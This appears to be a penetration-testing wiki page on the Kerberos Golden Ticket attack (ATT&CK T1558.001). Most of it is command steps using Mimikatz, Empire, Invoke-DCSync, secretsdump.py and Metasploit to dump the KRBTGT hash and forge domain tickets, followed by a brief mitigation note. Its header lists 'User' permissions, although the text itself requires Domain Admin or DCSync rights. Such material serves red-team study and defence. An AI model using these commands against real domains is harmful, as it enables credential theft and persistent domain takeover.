---
description: https://attack.mitre.org/techniques/T1558/001/
---

# Golden Ticket

**ATT\&CK ID:** [T1558.001](https://attack.mitre.org/techniques/T1558/001/)

**Permissions Required:** <mark style="color:green;">**User**</mark>

**Description**

A Golden ticket attack is a post compromise Active Directory attack where a compromised account such as a Domain Administrator or an account with DCSync rights, can dump the KRBTGT account hash and create a golden ticket that effectively, gives the attacker persistence and the ability to access any resource on the domain.

Every time the attacker wants to access a resource they can forge a ticket for that resource in which they can use for access.

## **Techniques**

### Mimikatz (Scenario)

The scenario for the attack is we are an attacker who has compromised the Domain Administrator account and is currently running a session under this account. We are on a fully patched Windows Server 2019 system. We have transferred Mimikatz over to the DC and have started up a shell.

Firstly, lets check our privileges on Mimikatz.

```
Privilege::debug
```

![](<../../../../.gitbook/assets/image (1973).png>)

We should be good to proceed with the return value of '20'. The debug privilege allows local Administrators to attach debuggers to programs. Mimikatz uses this for processes such as LSASS. If the account did not have this access, Mimikatz would be more limited in what it is able to achieve.

We now need to pull relevant information from the KRBTGT account for us to construct the Golden Ticket attack.

```
lsadump::lsa /inject /name:krbtgt
```

From the output of this command we need the following information:

* Domain SID
* KRBTGT NTLM hash

| Domain SID                                | NTLM Hash                        |
| ----------------------------------------- | -------------------------------- |
| S-1-5-21-2356823372-3609795904-2142328116 | ab20acb811769e025aba7d4fef487b96 |

After obtaining this information, we need to put it all together:

```
kerberos::golden /User:Administrator /domain:vuln.local /sid:S-1-5-21-2356823372-3609795904-2142328116 /krbtgt:ab20acb811769e025aba7d4fef487b96 /id:500 /ptt
```

Where:

* /User: Can be any user. The account does not need to exists for this.
* /Domain: is the domain name
* /SID: is the Domain SID
* /Krbtgt: is the NTLM hash of the KRBTGT account.
* id: is the RID of the administrator account which is 500 by default.
* ptt: informs Mimitkaz to pass the ticket over to our next session.

We can confirm if this has worked by checking the last line of the out for:

_'Golden ticket for 'Administrator @ vuln.local 'successfully submitted for current session'_.

![](<../../../../.gitbook/assets/image (1974).png>)

We can then create a separate command shell, using the Golden Ticket, with the following command:

```
misc::cmd
```

With the newly created command shell, we can run the command `dir` on a workstation on the network:

![](<../../../../.gitbook/assets/image (1975).png>)

### Empire

```bash
# PowerShell
powershell/credentials/mimikatz/golden_ticket
```

## Methods of KRBTGT hash retrieval

#### DCSync

```bash
# Mimikatz
lsadump::dcsync /domain:security.local /all
lsadump::dcsync /domain:security.local /user:krbtgt
lsadump::lsa /patch
```

#### Empire

```bash
usemodule credentials/mimikatz/dcsync_hashdump
```

#### Invoke-DCSync

**Resource:** [https://gist.github.com/monoxgas/9d238accd969550136db](https://gist.github.com/monoxgas/9d238accd969550136db)

```bash
Invoke-DCSync
Invoke-DCSync -PWDumpFormat
```

#### NTDS.DIT

```bash
# Impact Secrets.py
secretsdump.py <Domain>/<Username>:<Password>@<Domain-Controller>
```

#### Metasploit

```bash
use auxiliary/admin/smb/psexec_ntdsgrab
use windows/gather/credentials/domain_hashdump
```

## Mitigation

For containing the impact of a previously generated golden ticket, reset the built-in KRBTGT account password twice, which will invalidate any existing golden tickets that have been created with the KRBTGT hash and other Kerberos tickets derived from it. For each domain, change the KRBTGT account password once, force replication, and then change the password a second time. Consider rotating the KRBTGT account password every 180 days. [\[source\]](https://www.stigviewer.com/stig/windows\_server\_2016/2019-12-12/finding/V-91779)

##
